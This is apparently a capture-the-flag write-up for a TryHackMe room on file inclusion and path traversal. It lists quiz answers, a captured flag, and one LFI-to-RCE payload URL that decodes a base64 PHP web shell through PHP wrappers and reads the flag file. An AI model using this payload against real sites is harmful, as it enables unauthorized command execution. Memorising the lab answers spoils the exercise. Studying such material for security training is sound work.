# [File Inclusion, Path Traversal](https://tryhackme.com/room/filepathtraversal)

## Task 1  Introduction
+ Objectives
    - Understand what File Inclusion and Path Traversal attacks are and their impact.
    - Identify File Inclusion and Path Traversal vulnerabilities in web applications.
    - Exploit these vulnerabilities in a controlled environment.
    - Understand and apply measures to mitigate and prevent these vulnerabilities.
## Task 2  Web Application Architecture
+ Click me to proceed to the next task. `No Answer Needed`
## Click me to proceed to the next task.
+ What kind of pathing refers to locating files based on the current directory?`Relative pathing`
+ What kind of pathing involves the file's complete path, which usually starts from the root directory?`Absolute pathing`
## Task 4  PHP Wrappers
+ What part of PHP's functionality allows users access to various data streams that can also access or execute code through built-in protocols?`PHP wrappers`
## Task 5  Base Directory Breakouts
+ Click me to proceed to the next task. `No Answer Needed`
## Task 6  LFI2RCE - Session Files
+ Click me to proceed to the next task. `No Answer Needed`
## Task 7  LFI2RCE - Log Poisoning
+ What technique does an attacker use to inject executable code into a web server's log file and then use a file inclusion vulnerability to include and execute the malicious code?`Log Poisoning`
## Task 8  LFI2RCE - Wrappers
+ What is the content of the hidden text file in the flags folder?`THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc}`
```payload
http://10.10.116.30/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat+flags/cd3c67e5079de2700af6cea0a405f9cc.txt
```